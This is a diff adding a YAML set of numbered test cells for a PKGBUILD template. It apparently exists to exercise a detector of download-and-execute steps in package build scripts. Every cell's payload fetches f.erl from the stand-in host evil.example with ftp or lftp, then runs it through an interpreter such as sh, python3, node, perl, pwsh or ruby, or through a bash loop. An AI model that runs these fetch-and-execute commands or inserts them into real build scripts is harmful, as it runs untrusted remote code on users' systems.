@@ -1,0 +1,281 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        ts-node f.erl
+  id: 303-ftpeof-tsnode
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        Rscript < f.erl
+  id: 304-ftpeof-rscriptlt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        pwsh < f.erl
+  id: 305-ftpeof-pwshlt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        python3 < f.erl
+  id: 306-ftpeof-py3lt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        perl < f.erl
+  id: 307-ftpeof-perllt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        node < f.erl
+  id: 308-ftpeof-nodelt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        tclsh < f.erl
+  id: 309-ftpeof-tclshlt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        php < f.erl
+  id: 310-ftpeof-phplt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        ruby < f.erl
+  id: 311-ftpeof-rubylt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        lua < f.erl
+  id: 312-ftpeof-lualt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        for x in *.erl; do bash "$x"; done
+  id: 314-ftpeof-loop
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        sh f.erl
+  id: 315-ftpstdin-sh
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        zx f.erl
+  id: 316-ftpstdin-zx
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        guile f.erl
+  id: 317-ftpstdin-guile
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        racket f.erl
+  id: 318-ftpstdin-racket
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        deno f.erl
+  id: 319-ftpstdin-deno
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        bun f.erl
+  id: 320-ftpstdin-bun
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        elixir f.erl
+  id: 321-ftpstdin-elixir
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        ts-node f.erl
+  id: 322-ftpstdin-tsnode
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        Rscript < f.erl
+  id: 323-ftpstdin-rscriptlt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        pwsh < f.erl
+  id: 324-ftpstdin-pwshlt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        python3 < f.erl
+  id: 325-ftpstdin-py3lt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        perl < f.erl
+  id: 326-ftpstdin-perllt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        node < f.erl
+  id: 327-ftpstdin-nodelt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        tclsh < f.erl
+  id: 328-ftpstdin-tclshlt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        php < f.erl
+  id: 329-ftpstdin-phplt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        ruby < f.erl
+  id: 330-ftpstdin-rubylt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        lua < f.erl
+  id: 331-ftpstdin-lualt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        for x in *.erl; do bash "$x"; done
+  id: 333-ftpstdin-loop
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        sh f.erl
+  id: 334-lftpe-sh
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        zx f.erl
+  id: 335-lftpe-zx
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        guile f.erl
+  id: 336-lftpe-guile
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        racket f.erl
+  id: 337-lftpe-racket
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 338-lftpe-deno
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 339-lftpe-bun
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        elixir f.erl
+  id: 340-lftpe-elixir
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ts-node f.erl
+  id: 341-lftpe-tsnode
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        Rscript < f.erl
+  id: 342-lftpe-rscriptlt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        pwsh < f.erl
+  id: 343-lftpe-pwshlt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        python3 < f.erl
+  id: 344-lftpe-py3lt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        perl < f.erl
+  id: 345-lftpe-perllt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        node < f.erl
+  id: 346-lftpe-nodelt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        tclsh < f.erl
+  id: 347-lftpe-tclshlt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        php < f.erl
+  id: 348-lftpe-phplt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ruby < f.erl
+  id: 349-lftpe-rubylt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        lua < f.erl
+  id: 350-lftpe-lualt
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 352-lftpe-loop
